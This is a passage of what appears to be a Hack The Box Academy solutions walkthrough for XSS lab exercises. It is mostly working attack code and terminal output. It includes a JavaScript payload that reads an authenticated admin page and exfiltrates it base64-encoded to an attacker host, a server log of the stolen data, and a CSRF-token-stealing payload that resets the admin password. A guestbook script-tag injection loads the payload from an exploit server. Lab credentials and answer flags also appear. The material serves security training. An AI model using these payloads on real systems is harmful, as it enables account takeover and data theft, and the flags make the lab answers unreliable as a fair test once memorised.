echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJ1aSBjb250YWluZXIgbWVudSI+CgkJCTxkaXYgY2xhc3M9ImhlYWRlciBpdGVtIj4KCQkJCU15IEd1ZXN0Qm9vawoJCQk8L2Rpdj4KCQkJPGEgY2xhc3M9Iml0ZW0iIGhyZWY9ImhvbWUucGhwIj4KCQkJCUhvbWUKCQkJPC9hPgoJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9InZpZXcucGhwIj4KCQkgICAgCVZpZXcgYWxsIEVudHJpZXMKCQkgIAk8L2E+CgkJCQkJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImFkbWluLnBocCI+CgkJICAgIAkJQWRtaW5pc3RyYXRvciBEYXNoYm9hcmQKCQkgIAkJPC9hPgogICAgICAgICAgICAJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImxvZ291dC5waHAiPgoJCSAgICAJTG9nb3V0CgkJICAJPC9hPgoJCTwvZGl2PgoJCTxkaXYgY2xhc3M9InVpIHJhaXNlZCB2ZXJ5IHBhZGRlZCBjb250YWluZXIgc2VnbWVudCI+CgkJCTxkaXYgY2xhc3M9InVpIGNlbnRlcmVkIGdyaWQiPgoJCQkgICAgPGRpdiBjbGFzcz0iZWlnaHQgd2lkZSBjZW50ZXIgYWxpZ25lZCBjb2x1bW4iPgoJCQkgICAgCTxpbWcgc3JjPSJhc3NldHMvYWNlLnBuZyIgd2lkdGg9IjUwcHg7aGVpZ2h0OmF1dG87Ij4KCQkJICAgIAk8aDEgc3R5bGU9Im1hcmdpbi1ib3R0b206IDAiPldyaXRlIGFuIEVudHJ5IHRvIHRoZSBHdWVzdGJvb2s8L2gxPgogICAgICAgICAgICAgICAgICAgIAoJCQkgICAgCTxmb3JtIGNsYXNzPSJ1aSBmb3JtIGxlZnQgYWxpZ25lZCBzaXggY29sdW1uIHNlZ21lbnQiIGFjdGlvbj0iL2hvbWUucGhwIiBtZXRob2Q9InBvc3QiIG5hbWU9ImZvcm0iIGlkPSJmb3JtIj4KICAgICAgICAgICAgICAgICAgICAJCQkgICAgCSAgPGRpdiBjbGFzcz0iZmllbGQiPgoJCQkgICAgCSAgICAgIDxsYWJlbD5Db21tZW50PC9sYWJlbD4KCQkJICAgIAkgICAgICA8dGV4dGFyZWEgbmFtZT0iY29tbWVudCIgaWQ9ImNvbW1lbnQiPjwvdGV4dGFyZWE+CgkJCSAgICAJICA8L2Rpdj4KCQkJICAgIAkgIDxidXR0b24gY2xhc3M9InVpIHN1Ym1pdCBidXR0b24iIHR5cGU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+CgkJCSAgICAJPC9mb3JtPgoJCQkgICAgPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy51aS5jaGVja2JveCcpCgkJICAuY2hlY2tib3goKQoJCTsKCQkkKCcubWVzc2FnZSAuY2xvc2UnKQoJCSAgLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewoJCSAgICAkKHRoaXMpCgkJICAgICAgLmNsb3Nlc3QoJy5tZXNzYWdlJykKCQkgICAgICAudHJhbnNpdGlvbignZmFkZScpCgkJICAgIDsKCQkgIH0pCgkJOwoJCSQoJy51aS5mb3JtJykKCQkgIC5mb3JtKHsKCQkgICAgZmllbGRzOiB7CgkJICAgICAgZnVsbG5hbWUgOiAnZW1wdHknLAoJCSAgICAgIGVtYWlsICAgOiAnZW1haWwnLAoJCSAgICAgIGNvbW1lbnQgIDogJ2VtcHR5JywKCQkgICAgICB0ZXJtcyAgICA6ICdjaGVja2VkJwoJCSAgICB9CgkJICB9KQoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d 
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJ1aSBjb250YWluZXIgbWVudSI+CgkJCTxkaXYgY2xhc3M9ImhlYWRlciBpdGVtIj4KCQkJCU15IEd1ZXN0Qm9vawoJCQk8L2Rpdj4KCQkJPGEgY2xhc3M9Iml0ZW0iIGhyZWY9ImhvbWUucGhwIj4KCQkJCUhvbWUKCQkJPC9hPgoJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9InZpZXcucGhwIj4KCQkgICAgCVZpZXcgYWxsIEVudHJpZXMKCQkgIAk8L2E+CgkJCQkJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImFkbWluLnBocCI+CgkJICAgIAkJQWRtaW5pc3RyYXRvciBEYXNoYm9hcmQKCQkgIAkJPC9hPgogICAgICAgICAgICAJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImxvZ291dC5waHAiPgoJCSAgICAJTG9nb3V0CgkJICAJPC9hPgoJCTwvZGl2PgoJCTxkaXYgY2xhc3M9InVpIHJhaXNlZCB2ZXJ5IHBhZGRlZCBjb250YWluZXIgc2VnbWVudCI+CgkJCTxkaXYgY2xhc3M9InVpIGNlbnRlcmVkIGdyaWQiPgoJCQkgICAgPGRpdiBjbGFzcz0iZWlnaHQgd2lkZSBjZW50ZXIgYWxpZ25lZCBjb2x1bW4iPgoJCQkgICAgCTxpbWcgc3JjPSJhc3NldHMvYWNlLnBuZyIgd2lkdGg9IjUwcHg7aGVpZ2h0OmF1dG87Ij4KCQkJICAgIAk8aDEgc3R5bGU9Im1hcmdpbi1ib3R0b206IDAiPldyaXRlIGFuIEVudHJ5IHRvIHRoZSBHdWVzdGJvb2s8L2gxPgogICAgICAgICAgICAgICAgICAgIAoJCQkgICAgCTxmb3JtIGNsYXNzPSJ1aSBmb3JtIGxlZnQgYWxpZ25lZCBzaXggY29sdW1uIHNlZ21lbnQiIGFjdGlvbj0iL2hvbWUucGhwIiBtZXRob2Q9InBvc3QiIG5hbWU9ImZvcm0iIGlkPSJmb3JtIj4KICAgICAgICAgICAgICAgICAgICAJCQkgICAgCSAgPGRpdiBjbGFzcz0iZmllbGQiPgoJCQkgICAgCSAgICAgIDxsYWJlbD5Db21tZW50PC9sYWJlbD4KCQkJICAgIAkgICAgICA8dGV4dGFyZWEgbmFtZT0iY29tbWVudCIgaWQ9ImNvbW1lbnQiPjwvdGV4dGFyZWE+CgkJCSAgICAJICA8L2Rpdj4KCQkJICAgIAkgIDxidXR0b24gY2xhc3M9InVpIHN1Ym1pdCBidXR0b24iIHR5cGU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+CgkJCSAgICAJPC9mb3JtPgoJCQkgICAgPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy51aS5jaGVja2JveCcpCgkJICAuY2hlY2tib3goKQoJCTsKCQkkKCcubWVzc2FnZSAuY2xvc2UnKQoJCSAgLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewoJCSAgICAkKHRoaXMpCgkJICAgICAgLmNsb3Nlc3QoJy5tZXNzYWdlJykKCQkgICAgICAudHJhbnNpdGlvbignZmFkZScpCgkJICAgIDsKCQkgIH0pCgkJOwoJCSQoJy51aS5mb3JtJykKCQkgIC5mb3JtKHsKCQkgICAgZmllbGRzOiB7CgkJICAgICAgZnVsbG5hbWUgOiAnZW1wdHknLAoJCSAgICAgIGVtYWlsICAgOiAnZW1haWwnLAoJCSAgICAgIGNvbW1lbnQgIDogJ2VtcHR5JywKCQkgICAgICB0ZXJtcyAgICA6ICdjaGVja2VkJwoJCSAgICB9CgkJICB9KQoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d 

<!DOCTYPE html>
<html>
	<head>
 		<meta charset="utf-8">

<SNIP>

							<a class="active item" href="admin.php">
		    		Administrator Dashboard
		  		</a>

<SNIP>
```

Students will identify the `admin.php` endpoint within the decoded data. Therefore, students need to adjust the payload hosted on the exploit server to exfiltrate data from `/admin.php`:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://xssintro.htb/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![[HTB Solutions/CWEE/z. images/892e0a15055c66f5e62fb2ef333628a6_MD5.jpg]]

Students need to wait a few moments, then check their exfiltration server to find the Base64 encoded contents of the `admin.php` endpoint:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ python3 server.py

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

<SNIP>

10.129.233.62 - - [28/Jan/2025 01:10:26] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQns1NjY1ZmQxYjg5OWEyNzYwY2E2ZDAyOTZiNzY4Njk5MX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ HTTP/1.1" 404 -
```

Finally, students need to decode the response while using `grep` to identify the contents of the flag:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQns1NjY1ZmQxYjg5OWEyNzYwY2E2ZDAyOTZiNzY4Njk5MX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d | grep HTB
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQns1NjY1ZmQxYjg5OWEyNzYwY2E2ZDAyOTZiNzY4Njk5MX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d | grep HTB
												<p>HTB{5665fd1b899a2760ca6d0296b7686991}</p>
```

Answer: `HTB{5665fd1b899a2760ca6d0296b7686991}`

# Launching Attacks from the Victim's Session

## Question 1

### "Exploit the XSS vulnerability to takeover the victim's account with the username admin."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb victim-session.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-m72hhtgovx]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.206.246 exploitserver.htb victim-session.htb" >> /etc/hosts'
```

Next, students need to sign in to `https://victim-session.htb` using the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/7e9e9cfd9e1c2dd5efd1a2d38210095a_MD5.jpg]]

Upon logging in, students need to right-click and `View Page Source`, identifying the attribute `id="csrf_token"` with the value being set to the user's CSRF token:

![[HTB Solutions/CWEE/z. images/03b1f506ad3806c17861834ee104919f_MD5.jpg]]

Additionally, the vulnerable site has a form to update the user's profile:

![[HTB Solutions/CWEE/z. images/bf8c775d86fe473433d0e21412d25ff3_MD5.jpg]]

Students need to open the Firefox Developer Console by pressing `F12` and then navigating to the `Network` tab. Subsequently, students need to press the `Submit` button and inspect the request, discovering the data being sent:

![[HTB Solutions/CWEE/z. images/942c694f7cc28fa0e31e7c0514066560_MD5.jpg]]

Having identified the location of the CSRF token within the page's HTML, along with the necessary data to be sent in the POST request, students need to craft an XSS payload to force the administrator user to update their profile and change their password:

Code: js

```js
// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://victim-session.htb/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = \`username=admin&email=admin@vulnerablesite.htb&password=pwned&csrf_token=${csrftoken}\`;
csrf_req.open('POST', 'https://victim-session.htb/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

Students need to save the payload to the exploit server (`https://exploitserver.htb`). Then, they need to return to the vulnerable site and leave a comment in the guestbook, referencing the external script:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

After a few moments, students need to log out of the vulnerable site and log back in with the credentials `admin:pwned`. Once logged in, students need to navigate to the Administrator Dashboard seen at the top of the page, revealing the flag:

![[HTB Solutions/CWEE/z. images/02fcce2f206b6f411427fea27e07c060_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/9b75da2d0a643998963f4d19f3af302b_MD5.jpg]]

Answer: `HTB{ef6822275912cb2e1f2e3ab8d3b5e4fe}`

# Enumerating internal APIs

## Question 1

### "Exploit the XSS vulnerability to enumerate the API and obtain the flag."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb internal-apis.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-vhzoopvc62]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.68.105 exploitserver.htb internal-apis.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site (`https://internal-apis.htb`) using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![[HTB Solutions/CWEE/z. images/4b36e537cd0f18bb5cd991282fd0531f_MD5.jpg]]

